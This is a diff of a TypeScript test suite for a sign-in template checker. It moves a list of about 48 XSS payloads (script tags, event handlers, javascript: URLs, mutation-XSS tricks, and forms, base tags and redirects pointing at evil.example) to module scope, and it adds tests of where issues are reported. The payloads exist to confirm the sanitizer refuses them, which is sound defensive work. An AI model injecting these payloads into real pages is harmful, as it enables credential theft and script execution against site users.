@@ -365,63 +365,115 @@ describe('bounds before the parser', () => {
   });
 });
 
-describe('hostile corpus', () => {
-  const payloads: string[] = [
-    '<script>alert(1)</script>',
-    '<img src=x onerror=alert(1)>',
-    '<img src="x" onerror="alert(1)" alt="x">',
-    '<a href="JaVaScRiPt:alert(1)" rel="noopener noreferrer">x</a>',
-    '<a href="&#106;avascript:alert(1)" rel="noopener noreferrer">x</a>',
-    '<a href="vbscript:msgbox(1)" rel="noopener noreferrer">x</a>',
-    '<a href="data:text/html;base64,PHNjcmlwdD4=" rel="noopener noreferrer">x</a>',
-    '<svg onload=alert(1)>',
-    '<svg><script>alert(1)</script></svg>',
-    '<svg><style>@import url(//evil.example/x.css)</style></svg>',
-    '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
-    '<form action="https://evil.example"><input name="password"></form>',
-    '<form><form><input></form></form>',
-    '<base href="https://evil.example/">',
-    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
-    '<link rel="stylesheet" href="https://evil.example/x.css">',
-    '<style>@import "//evil.example/x.css";</style>',
-    '<p style="width:expression(alert(1))">x</p>',
-    '<p style="background:url(javascript:alert(1))">x</p>',
-    '<iframe src="https://evil.example"></iframe>',
-    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
-    '<object data="x.swf"></object>',
-    '<embed src="x.swf">',
-    '<button formaction="https://evil.example">x</button>',
-    '<input type="image" src="x" onerror="alert(1)">',
-    '<select><option>x</option></select>',
-    '<textarea>x</textarea>',
-    '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>',
-    '<p><svg><style><a id="</style><img src=x onerror=alert(1)>"></p>',
-    '<template><script>alert(1)</script></template>',
-    '<details open ontoggle=alert(1)>x</details>',
-    '<div onpointerenter="alert(1)">x</div>',
-    '<x-evil onclick="alert(1)">x</x-evil>',
-    '<p><a href="https://example.com" onclick="alert(1)" rel="noopener noreferrer">x</a></p>',
-    '<a href="https://example.com">no rel</a>',
-    '<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a>',
-    '<!--[if IE]><script>alert(1)</script><![endif]-->',
-    '<![CDATA[<script>alert(1)</script>]]>',
-    '<plaintext>x',
-    '<xmp><script>alert(1)</script></xmp>',
-    '<marquee onstart=alert(1)>x</marquee>',
-    '<video><source onerror=alert(1)></video>',
-    '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
-    '<div id="x" class="y">clobber</div>',
-    '<img src="https://evil.example/pixel.gif" alt="">',
-    '<p>{{script}}</p>',
-    '<p class="{{error}}">x</p>',
-    '<p>&#60;script&#62;</p><script>x</script>',
-  ];
+const payloads: string[] = [
+  '<script>alert(1)</script>',
+  '<img src=x onerror=alert(1)>',
+  '<img src="x" onerror="alert(1)" alt="x">',
+  '<a href="JaVaScRiPt:alert(1)" rel="noopener noreferrer">x</a>',
+  '<a href="&#106;avascript:alert(1)" rel="noopener noreferrer">x</a>',
+  '<a href="vbscript:msgbox(1)" rel="noopener noreferrer">x</a>',
+  '<a href="data:text/html;base64,PHNjcmlwdD4=" rel="noopener noreferrer">x</a>',
+  '<svg onload=alert(1)>',
+  '<svg><script>alert(1)</script></svg>',
+  '<svg><style>@import url(//evil.example/x.css)</style></svg>',
+  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
+  '<form action="https://evil.example"><input name="password"></form>',
+  '<form><form><input></form></form>',
+  '<base href="https://evil.example/">',
+  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
+  '<link rel="stylesheet" href="https://evil.example/x.css">',
+  '<style>@import "//evil.example/x.css";</style>',
+  '<p style="width:expression(alert(1))">x</p>',
+  '<p style="background:url(javascript:alert(1))">x</p>',
+  '<iframe src="https://evil.example"></iframe>',
+  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
+  '<object data="x.swf"></object>',
+  '<embed src="x.swf">',
+  '<button formaction="https://evil.example">x</button>',
+  '<input type="image" src="x" onerror="alert(1)">',
+  '<select><option>x</option></select>',
+  '<textarea>x</textarea>',
+  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>',
+  '<p><svg><style><a id="</style><img src=x onerror=alert(1)>"></p>',
+  '<template><script>alert(1)</script></template>',
+  '<details open ontoggle=alert(1)>x</details>',
+  '<div onpointerenter="alert(1)">x</div>',
+  '<x-evil onclick="alert(1)">x</x-evil>',
+  '<p><a href="https://example.com" onclick="alert(1)" rel="noopener noreferrer">x</a></p>',
+  '<a href="https://example.com">no rel</a>',
+  '<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a>',
+  '<!--[if IE]><script>alert(1)</script><![endif]-->',
+  '<![CDATA[<script>alert(1)</script>]]>',
+  '<plaintext>x',
+  '<xmp><script>alert(1)</script></xmp>',
+  '<marquee onstart=alert(1)>x</marquee>',
+  '<video><source onerror=alert(1)></video>',
+  '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
+  '<div id="x" class="y">clobber</div>',
+  '<img src="https://evil.example/pixel.gif" alt="">',
+  '<p>{{script}}</p>',
+  '<p class="{{error}}">x</p>',
+  '<p>&#60;script&#62;</p><script>x</script>',
+];
 
+describe('hostile corpus', () => {
   it('has at least 25 payloads', () => {
     expect(payloads.length).toBeGreaterThanOrEqual(25);
   });
 
   it.each(payloads)('refuses %s', (payload) => {
     expect(refused(withFragment(payload))).toBe(true);
+  });
+});
+
+describe('issue positions', () => {
+  const at = (template: string): { code: string; line: number | null; column: number | null }[] =>
+    checkTemplate('sign-in', template).map(({ code, line, column }) => ({ code, line, column }));
+
+  it('points at the tag of a refused attribute', () => {
+    const template = `${SIGN_IN}\n<section>\n    <div onclick=x>a</div>\n</section>`;
+    expect(at(template)).toEqual([{ code: 'attribute-not-allowed', line: 3, column: 5 }]);
+  });
+
+  it('points at an element with no end tag in the source', () => {
+    const template = `${SIGN_IN}\n<span>x`;
+    expect(at(template)).toEqual([{ code: 'unclosed-element', line: 2, column: 1 }]);
+    const detail = checkTemplate('sign-in', template)[0]?.detail;
+    expect(detail).toBe('span has no end tag in the source');
+  });
+
+  it('points at the second occurrence of a repeated part', () => {
+    const template = `{{form.open}}{{fields}}\n{{submit}}\n  {{submit}}{{form.close}}`;
+    expect(at(template)).toEqual([{ code: 'repeated-part', line: 3, column: 3 }]);
+  });
+
+  it('points at an unknown slot and at a dropped tag', () => {
+    expect(at(`${SIGN_IN}\n{{nope}}`)).toEqual([{ code: 'unknown-slot', line: 2, column: 1 }]);
+    expect(at(`${SIGN_IN}\n\n  <frame>`)[0]).toEqual({
+      code: 'element-not-allowed',
+      line: 3,
+      column: 3,
+    });
+  });
+
+  it('has no position where there is no single place', () => {
+    expect(at('a'.repeat(70_000))).toEqual([{ code: 'too-large', line: null, column: null }]);
+    expect(at('<p>x</p>').map(({ line }) => line)).toEqual([null, null, null, null]);
+  });
+
+  it('keeps every position in the corpus inside the template', () => {
+    for (const payload of payloads) {
+      const template = `${SIGN_IN}\n${payload}`;
+      const lines = template.split('\n').length;
+      for (const { line, column } of checkTemplate('sign-in', template)) {
+        if (line === null) {
+          expect(column).toBeNull();
+        } else {
+          expect(line).toBeGreaterThanOrEqual(1);
+          expect(line).toBeLessThanOrEqual(lines);
+          expect(column).toBeGreaterThanOrEqual(1);
+        }
+      }
+    }
   });
 });
